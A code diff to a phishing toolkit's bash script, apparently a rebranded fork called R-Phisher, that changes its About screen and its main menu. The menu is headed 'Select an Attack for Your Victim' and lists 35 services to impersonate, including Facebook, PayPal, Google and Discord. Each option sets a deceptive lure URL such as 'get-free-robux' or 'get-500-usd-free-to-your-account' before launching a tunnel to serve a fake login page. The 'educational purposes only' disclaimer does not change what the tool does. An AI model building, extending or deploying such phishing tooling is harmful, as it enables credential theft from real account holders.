@@ -353,27 +353,39 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
-		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
+		${RED}╭──────────────────────────────────────────────────────────╮
+		${RED}│${WHITE}                🔥 ABOUT R-PHISHER 🔥                     ${RED}│
+		${RED}╰──────────────────────────────────────────────────────────╯
 
-		${WHITE} ${REDBG}Warning:${RESETBG}
-		${CYAN}  This Tool is made for educational purpose 
-		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
-		  any misuse of this toolkit ${RED}!${WHITE}
+		${RED}╭───────────────┬─────────────────────────────────────────╮
+		${RED}│${GREEN} Author        ${RED}│${ORANGE} REDWOODS KENYAN  ${RED}[${ORANGE}REDWOODSKEN-INC${RED}] │
+		${RED}│${GREEN} Github        ${RED}│${CYAN} https://github.com/KenyanRedwoods01/redkenzphisher${RED} │
+		${RED}│${GREEN} Website       ${RED}│${CYAN} https://redwoodskenyan.vercel.app/ ${RED}│
+		${RED}│${GREEN} Version       ${RED}│${ORANGE} ${__version__} ${RED}│
+		${RED}╰───────────────┴─────────────────────────────────────────╯
 		
-		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
-		  Yisus7u7
+		${RED}╭──────────────────────────────────────────────────────────╮
+		${RED}│${WHITE} ⚠️ WARNING: This tool is for educational purposes only!     ${RED}│
+		${RED}│${WHITE} The author is NOT responsible for any misuse.              ${RED}│
+		${RED}╰──────────────────────────────────────────────────────────╯
+		
+		${RED}╭──────────────────────────────────────────────────────────╮
+		${RED}│${WHITE} ⭐ SPECIAL THANKS TO:                                     ${RED}│
+		${RED}│${GREEN} 1RaY-1, Adi1090x, AliMilani, BDhackers009, KasRoudra,     ${RED}│
+		${RED}│${GREEN} E343IO, sepp0, ThelinuxChoice, Yisus7u7                   ${RED}│
+		${RED}│${GREEN} Jay Montoya (Jaymontoya), Reza Rafati, Kevin Mitnick       ${RED}│
+		${RED}│${GREEN} John Hammond, TheXcutioner, Mubix, Ethical Chaos,           ${RED}│
+		${RED}│${GREEN} Heath Adams (Cyber Mentor), G0tmi1k, Raphael Mudge         ${RED}│
+		${RED}│${GREEN} Charlie Miller, Dan Kaminsky, HD Moore, Fyodor (Nmap)      ${RED}│
+		${RED}╰──────────────────────────────────────────────────────────╯
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
-
+		${RED}╭───────────────┬───────────────╮
+		${RED}│${WHITE} [00] Main Menu ${RED}│${WHITE} [99] Exit      ${RED}│
+		${RED}╰───────────────┴───────────────╯
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-	case $REPLY in 
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" choice
+	case $choice in 
 		99)
 			msg_exit;;
 		0 | 00)
@@ -741,178 +753,76 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}╭───────────────────────────────────────────────╮
-		${RED}│${WHITE}         🚀 Select an Attack for Your Victim       ${RED}│
-		${RED}╰───────────────────────────────────────────────╯
+		${RED}╭──────────────────────────────────────────────────────────╮
+		${RED}│${WHITE} 🚀 SELECT AN ATTACK FOR YOUR VICTIM                     ${RED}│
+		${RED}╰──────────────────────────────────────────────────────────╯
 
-		${RED}╭─────────────────────┬─────────────────────┬─────────────────────╮
-		${RED}│${WHITE} [01] Facebook      ${RED}│${WHITE} [11] Twitch       ${RED}│${WHITE} [21] DeviantArt    ${RED}│
-		${RED}│${WHITE} [02] Instagram     ${RED}│${WHITE} [12] Pinterest    ${RED}│${WHITE} [22] Badoo         ${RED}│
-		${RED}│${WHITE} [03] Google        ${RED}│${WHITE} [13] Snapchat     ${RED}│${WHITE} [23] Origin        ${RED}│
-		${RED}│${WHITE} [04] Microsoft     ${RED}│${WHITE} [14] Linkedin     ${RED}│${WHITE} [24] Dropbox       ${RED}│
-		${RED}│${WHITE} [05] Netflix       ${RED}│${WHITE} [15] Ebay         ${RED}│${WHITE} [25] Yahoo         ${RED}│
-		${RED}│${WHITE} [06] Paypal        ${RED}│${WHITE} [16] Quora        ${RED}│${WHITE} [26] Wordpress     ${RED}│
-		${RED}│${WHITE} [07] Steam         ${RED}│${WHITE} [17] Protonmail   ${RED}│${WHITE} [27] Yandex        ${RED}│
-		${RED}│${WHITE} [08] Twitter       ${RED}│${WHITE} [18] Spotify      ${RED}│${WHITE} [28] StackOverflow ${RED}│
-		${RED}│${WHITE} [09] Playstation   ${RED}│${WHITE} [19] Reddit       ${RED}│${WHITE} [29] VK            ${RED}│
-		${RED}│${WHITE} [10] Tiktok        ${RED}│${WHITE} [20] Adobe        ${RED}│${WHITE} [30] XBOX          ${RED}│
-		${RED}╰─────────────────────┴─────────────────────┴─────────────────────╯
-		${RED}╭─────────────────────┬─────────────────────┬─────────────────────╮
-		${RED}│${WHITE} [31] Mediafire     ${RED}│${WHITE} [32] Gitlab       ${RED}│${WHITE} [33] Github        ${RED}│
-		${RED}│${WHITE} [34] Discord       ${RED}│${WHITE} [35] Roblox       ${RED}│                         ${RED}│
-		${RED}╰─────────────────────┴─────────────────────┴─────────────────────╯
+		${RED}╭───────────────┬───────────────┬───────────────╮
+		${RED}│${WHITE} [01] Facebook  ${RED}│${WHITE} [11] Twitch    ${RED}│${WHITE} [21] DeviantArt ${RED}│
+		${RED}│${WHITE} [02] Instagram ${RED}│${WHITE} [12] Pinterest ${RED}│${WHITE} [22] Badoo      ${RED}│
+		${RED}│${WHITE} [03] Google    ${RED}│${WHITE} [13] Snapchat  ${RED}│${WHITE} [23] Origin     ${RED}│
+		${RED}│${WHITE} [04] Microsoft ${RED}│${WHITE} [14] LinkedIn  ${RED}│${WHITE} [24] Dropbox    ${RED}│
+		${RED}│${WHITE} [05] Netflix   ${RED}│${WHITE} [15] eBay      ${RED}│${WHITE} [25] Yahoo      ${RED}│
+		${RED}│${WHITE} [06] PayPal    ${RED}│${WHITE} [16] Quora     ${RED}│${WHITE} [26] WordPress  ${RED}│
+		${RED}│${WHITE} [07] Steam     ${RED}│${WHITE} [17] ProtonMail${RED}│${WHITE} [27] Yandex     ${RED}│
+		${RED}│${WHITE} [08] Twitter   ${RED}│${WHITE} [18] Spotify   ${RED}│${WHITE} [28] StackOverflow${RED}│
+		${RED}│${WHITE} [09] PlayStation${RED}│${WHITE} [19] Reddit   ${RED}│${WHITE} [29] VK         ${RED}│
+		${RED}│${WHITE} [10] TikTok    ${RED}│${WHITE} [20] Adobe    ${RED}│${WHITE} [30] XBOX       ${RED}│
+		${RED}╰───────────────┴───────────────┴───────────────╯
 
-		${RED}╭───────────────────────────────────────────────╮
-		${RED}│${WHITE}  [99] About                              [00] Exit   ${RED}│
-		${RED}╰───────────────────────────────────────────────╯
+		${RED}╭───────────────┬───────────────┬───────────────╮
+		${RED}│${WHITE} [31] Mediafire ${RED}│${WHITE} [32] GitLab   ${RED}│${WHITE} [33] GitHub    ${RED}│
+		${RED}│${WHITE} [34] Discord   ${RED}│${WHITE} [35] Roblox   ${RED}│                   ${RED}│
+		${RED}╰───────────────┴───────────────┴───────────────╯
+
+		${RED}╭──────────────────────────────────────────────────────────╮
+		${RED}│${WHITE}  [99] About                              [00] Exit     ${RED}│
+		${RED}╰──────────────────────────────────────────────────────────╯
 	EOF
-}
 
-	EOF
-	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" choice
 
-	case $REPLY in 
-		1 | 01)
-			site_facebook;;
-		2 | 02)
-			site_instagram;;
-		3 | 03)
-			site_gmail;;
-		4 | 04)
-			website="microsoft"
-			mask='https://unlimited-onedrive-space-for-free'
-			tunnel_menu;;
-		5 | 05)
-			website="netflix"
-			mask='https://upgrade-your-netflix-plan-free'
-			tunnel_menu;;
-		6 | 06)
-			website="paypal"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		7 | 07)
-			website="steam"
-			mask='https://steam-500-usd-gift-card-free'
-			tunnel_menu;;
-		8 | 08)
-			website="twitter"
-			mask='https://get-blue-badge-on-twitter-free'
-			tunnel_menu;;
-		9 | 09)
-			website="playstation"
-			mask='https://playstation-500-usd-gift-card-free'
-			tunnel_menu;;
-		10)
-			website="tiktok"
-			mask='https://tiktok-free-liker'
-			tunnel_menu;;
-		11)
-			website="twitch"
-			mask='https://unlimited-twitch-tv-user-for-free'
-			tunnel_menu;;
-		12)
-			website="pinterest"
-			mask='https://get-a-premium-plan-for-pinterest-free'
-			tunnel_menu;;
-		13)
-			website="snapchat"
-			mask='https://view-locked-snapchat-accounts-secretly'
-			tunnel_menu;;
-		14)
-			website="linkedin"
-			mask='https://get-a-premium-plan-for-linkedin-free'
-			tunnel_menu;;
-		15)
-			website="ebay"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		16)
-			website="quora"
-			mask='https://quora-premium-for-free'
-			tunnel_menu;;
-		17)
-			website="protonmail"
-			mask='https://protonmail-pro-basics-for-free'
-			tunnel_menu;;
-		18)
-			website="spotify"
-			mask='https://convert-your-account-to-spotify-premium'
-			tunnel_menu;;
-		19)
-			website="reddit"
-			mask='https://reddit-official-verified-member-badge'
-			tunnel_menu;;
-		20)
-			website="adobe"
-			mask='https://get-adobe-lifetime-pro-membership-free'
-			tunnel_menu;;
-		21)
-			website="deviantart"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		22)
-			website="badoo"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		23)
-			website="origin"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		24)
-			website="dropbox"
-			mask='https://get-1TB-cloud-storage-free'
-			tunnel_menu;;
-		25)
-			website="yahoo"
-			mask='https://grab-mail-from-anyother-yahoo-account-free'
-			tunnel_menu;;
-		26)
-			website="wordpress"
-			mask='https://unlimited-wordpress-traffic-free'
-			tunnel_menu;;
-		27)
-			website="yandex"
-			mask='https://grab-mail-from-anyother-yandex-account-free'
-			tunnel_menu;;
-		28)
-			website="stackoverflow"
-			mask='https://get-stackoverflow-lifetime-pro-membership-free'
-			tunnel_menu;;
-		29)
-			site_vk;;
-		30)
-			website="xbox"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		31)
-			website="mediafire"
-			mask='https://get-1TB-on-mediafire-free'
-			tunnel_menu;;
-		32)
-			website="gitlab"
-			mask='https://get-1k-followers-on-gitlab-free'
-			tunnel_menu;;
-		33)
-			website="github"
-			mask='https://get-1k-followers-on-github-free'
-			tunnel_menu;;
-		34)
-			website="discord"
-			mask='https://get-discord-nitro-free'
-			tunnel_menu;;
-		35)
-			website="roblox"
-			mask='https://get-free-robux'
-			tunnel_menu;;
-		99)
-			about;;
-		0 | 00 )
-			msg_exit;;
-		*)
+	case $choice in 
+		1 | 01) site_facebook;;
+		2 | 02) site_instagram;;
+		3 | 03) site_gmail;;
+		4 | 04) website="microsoft"; mask='https://unlimited-onedrive-space-for-free'; tunnel_menu;;
+		5 | 05) website="netflix"; mask='https://upgrade-your-netflix-plan-free'; tunnel_menu;;
+		6 | 06) website="paypal"; mask='https://get-500-usd-free-to-your-account'; tunnel_menu;;
+		7 | 07) website="steam"; mask='https://steam-500-usd-gift-card-free'; tunnel_menu;;
+		8 | 08) website="twitter"; mask='https://get-blue-badge-on-twitter-free'; tunnel_menu;;
+		9 | 09) website="playstation"; mask='https://playstation-500-usd-gift-card-free'; tunnel_menu;;
+		10) website="tiktok"; mask='https://tiktok-free-liker'; tunnel_menu;;
+		11) website="twitch"; mask='https://unlimited-twitch-tv-user-for-free'; tunnel_menu;;
+		12) website="pinterest"; mask='https://get-a-premium-plan-for-pinterest-free'; tunnel_menu;;
+		13) website="snapchat"; mask='https://view-locked-snapchat-accounts-secretly'; tunnel_menu;;
+		14) website="linkedin"; mask='https://get-a-premium-plan-for-linkedin-free'; tunnel_menu;;
+		15) website="ebay"; mask='https://get-500-usd-free-to-your-account'; tunnel_menu;;
+		16) website="quora"; mask='https://quora-premium-for-free'; tunnel_menu;;
+		17) website="protonmail"; mask='https://protonmail-pro-basics-for-free'; tunnel_menu;;
+		18) website="spotify"; mask='https://convert-your-account-to-spotify-premium'; tunnel_menu;;
+		19) website="reddit"; mask='https://reddit-official-verified-member-badge'; tunnel_menu;;
+		20) website="adobe"; mask='https://get-adobe-lifetime-pro-membership-free'; tunnel_menu;;
+		21) website="deviantart"; mask='https://get-500-usd-free-to-your-account'; tunnel_menu;;
+		22) website="badoo"; mask='https://get-500-usd-free-to-your-account'; tunnel_menu;;
+		23) website="origin"; mask='https://get-500-usd-free-to-your-account'; tunnel_menu;;
+		24) website="dropbox"; mask='https://get-1TB-cloud-storage-free'; tunnel_menu;;
+		25) website="yahoo"; mask='https://grab-mail-from-any-other-yahoo-account-free'; tunnel_menu;;
+		26) website="wordpress"; mask='https://unlimited-wordpress-traffic-free'; tunnel_menu;;
+		27) website="yandex"; mask='https://grab-mail-from-any-other-yandex-account-free'; tunnel_menu;;
+		28) website="stackoverflow"; mask='https://get-stackoverflow-lifetime-pro-membership-free'; tunnel_menu;;
+		29) site_vk;;
+		30) website="xbox"; mask='https://get-500-usd-free-to-your-account'; tunnel_menu;;
+		31) website="mediafire"; mask='https://get-1TB-on-mediafire-free'; tunnel_menu;;
+		32) website="gitlab"; mask='https://get-1k-followers-on-gitlab-free'; tunnel_menu;;
+		33) website="github"; mask='https://get-1k-followers-on-github-free'; tunnel_menu;;
+		34) website="discord"; mask='https://get-discord-nitro-free'; tunnel_menu;;
+		35) website="roblox"; mask='https://get-free-robux'; tunnel_menu;;
+		99) about;;
+		0 | 00 ) msg_exit;;
+		*) 
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; main_menu; };;
-	
 	esac
 }
 
